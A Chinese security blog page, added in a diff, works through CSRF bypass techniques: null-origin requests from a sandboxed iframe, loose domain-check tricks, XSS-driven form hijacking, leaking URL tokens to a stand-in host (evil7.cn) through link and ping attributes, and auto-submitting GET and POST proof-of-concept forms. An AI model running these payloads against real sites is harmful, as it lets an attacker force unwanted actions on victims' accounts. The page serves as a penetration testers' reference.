@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>
+        Threezh1&#39;Blog
+    </title>
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            CSRF的绕过与利用
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <!--Table of Contents begin-->
+        
+            <div id="toc" class="toc-article">
+            <strong class="toc-title">目录</strong>
+            <a class="js-toggle-toc" href="javascript:void(0)"></a>
+            <div class="toc-content">
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Origin-amp-Referer-Bypass"><span class="toc-text">Origin &amp; Referer  Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Null%E5%80%BC%E7%BB%95%E8%BF%87"><span class="toc-text">Null值绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E6%A0%A1%E9%AA%8C%E7%BB%95%E8%BF%87"><span class="toc-text">域名校验绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88XSS%E8%BF%9B%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-text">配合XSS进行利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E8%A1%A8%E5%8D%95%E4%B8%AD%E7%9A%84token"><span class="toc-text">获取表单中的token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96url%E5%8F%82%E6%95%B0%E4%B8%AD%E7%9A%84token"><span class="toc-text">获取url参数中的token</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88URL%E8%B7%B3%E8%BD%AC%E6%BC%8F%E6%B4%9E"><span class="toc-text">配合URL跳转漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#X-Request-with-Bypass"><span class="toc-text">X-Request-with Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Token-Bypass"><span class="toc-text">Token Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-POC-%E6%9E%84%E9%80%A0"><span class="toc-text">CSRF POC 构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-CSRF"><span class="toc-text">GET - CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-CSRF"><span class="toc-text">POST - CSRF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83-amp-%E5%A4%87%E4%BB%BD"><span class="toc-text">参考 &amp; 备份</span></a></li></ol>
+            </div>
+            </div>
+        
+        <!--Table of Contents end -->
+        <h2 id="Origin-amp-Referer-Bypass"><a href="#Origin-amp-Referer-Bypass" class="headerlink" title="Origin &amp; Referer  Bypass"></a>Origin &amp; Referer  Bypass</h2><h3 id="Null值绕过"><a href="#Null值绕过" class="headerlink" title="Null值绕过"></a>Null值绕过</h3><p>当遇到一个cors可用null值绕过时，用iframe配合data协议，就可以发送一个origin为null的请求。这个绕过方式同样也可以用在CSRF这里。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span> <span class="attr">src</span>=<span class="string">&#x27;data:text/html,&lt;script&gt;var req=new XMLHttpRequest();req.onload=reqListener;req.open(&quot;get&quot;,&quot;http://127.0.0.1/test.html&quot;,true);req.withCredentials=true;req.send();function reqListener()&#123;alert(this.responseText)&#125;;&lt;/script&gt;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<h3 id="域名校验绕过"><a href="#域名校验绕过" class="headerlink" title="域名校验绕过"></a>域名校验绕过</h3><p>当域名校验不是特别严格时，可以通过以下几种方式进行绕过：</p>
+<ul>
+<li>在后面加域名    qq.com =&gt; qq.com.abc.com    </li>
+<li>将域名拼接       abc.qq.com =&gt; abc_qq.com</li>
+<li>在前面或者在后面加字符 qq.com =&gt; abcqq.com / qq.com =&gt; qq.comabc.com / qq.com =&gt; abc.com/qq.com</li>
+</ul>
+<h3 id="配合XSS进行利用"><a href="#配合XSS进行利用" class="headerlink" title="配合XSS进行利用"></a>配合XSS进行利用</h3><p>当同源网站中存在一个xss漏洞时，就可以直接使用xss包含CSRF的payload进行利用。不仅可以绕过简单的Referer和Origin验证，还可以劫持表单与URL中的token进行利用。</p>
+<h4 id="获取表单中的token"><a href="#获取表单中的token" class="headerlink" title="获取表单中的token"></a>获取表单中的token</h4><p>当token存在于表单中时，可以配合XSS漏洞进行表单劫持进而让token的限制。</p>
+<ul>
+<li>xss劫持页面中某个表单的提交</li>
+</ul>
+<p>像这个就可以劫持user-edit表单的提交，点击即可提交form表单。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">form</span>=<span class="string">&quot;user-edit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hijack&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个就相当于劫持了user-edit表单然后进行提交</p>
+<ul>
+<li>xss劫持页面表单并修改value</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">form</span>=<span class="string">&quot;user-edit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;notes&quot;</span> <span class="attr">value</span>=<span class="string">&quot;This is a test&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">form</span>=<span class="string">&quot;user-edit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;secert&quot;</span> <span class="attr">value</span>=<span class="string">&quot;on&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">form</span>=<span class="string">&quot;user-edit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hijack&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>劫持user-edit表单，覆盖各表单的value，进行CSRF利用。</p>
+<h4 id="获取url参数中的token"><a href="#获取url参数中的token" class="headerlink" title="获取url参数中的token"></a>获取url参数中的token</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://evil7.cn&quot;</span>&gt;</span>get_token<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://xz.aliyun.com/&quot;</span> <span class="attr">ping</span>=<span class="string">&quot;https://evil7.cn&quot;</span>&gt;</span>ping_leak<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7084">魔法才能打败魔法：关于获取csrf-token前端技巧思考</a></p>
+<h3 id="配合URL跳转漏洞"><a href="#配合URL跳转漏洞" class="headerlink" title="配合URL跳转漏洞"></a>配合URL跳转漏洞</h3><p>如果是GET形式的CSRF，配合URL跳转漏洞，即可Origin和Referer的限制。</p>
+<h2 id="X-Request-with-Bypass"><a href="#X-Request-with-Bypass" class="headerlink" title="X-Request-with Bypass"></a>X-Request-with Bypass</h2><p>使用swf进行绕过：<a target="_blank" rel="noopener" href="https://github.com/Qclover/CSRF">https://github.com/Qclover/CSRF</a></p>
+<h2 id="Token-Bypass"><a href="#Token-Bypass" class="headerlink" title="Token Bypass"></a>Token Bypass</h2><ul>
+<li>删除Token参数字段</li>
+<li>将Token参数值置空</li>
+</ul>
+<h2 id="CSRF-POC-构造"><a href="#CSRF-POC-构造" class="headerlink" title="CSRF POC 构造"></a>CSRF POC 构造</h2><h3 id="GET-CSRF"><a href="#GET-CSRF" class="headerlink" title="GET - CSRF"></a>GET - CSRF</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;http:&#x2F;&#x2F;xxxx.org&#x2F;csrf.php?xx&#x3D;11 &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="POST-CSRF"><a href="#POST-CSRF" class="headerlink" title="POST - CSRF"></a>POST - CSRF</h3><p>可以直接使用Brupsuite生成CSRF POC，也可以自己构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action&#x3D;http:&#x2F;&#x2F;aaaaaa.org&#x2F;csrf.php method&#x3D;POST&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;xx&quot; value&#x3D;&quot;11&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考-amp-备份"><a href="#参考-amp-备份" class="headerlink" title="参考 &amp; 备份"></a>参考 &amp; 备份</h2><ul>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6414">一次CSRF测试引发的思考</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7084">魔法才能打败魔法：关于获取csrf-token前端技巧思考</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/85">PhpcmsV9从反射型XSS到CSRF绕过到Getshell</a></p>
+</li>
+</ul>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p>Copyright © 2020 Threezh1
+        <!-- <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
+            <input type="checkbox" name="switch" id="update_style">
+            <span class="el-switch-style"></span>
+        </label> -->
+<!--         <script type="text/javascript">
+        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+        </script> -->
+    </p>
+</div>
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+    color: #698fca;
+}
+
+.v .vlist .vcard .vhead .vsys {
+    color: #3a3e4a;
+}
+
+.v .vlist .vcard .vh .vmeta .vat {
+    color: #638fd5;
+}
+
+.v .vlist .vcard .vhead .vnick {
+    color: #6ba1ff;
+}
+
+.v a {
+    color: #8696b1;
+}
+
+.v .vlist .vcard .vhead .vnick:hover {
+    color: #669bfc;
+}
+</style>
+</body>
+
+</html>
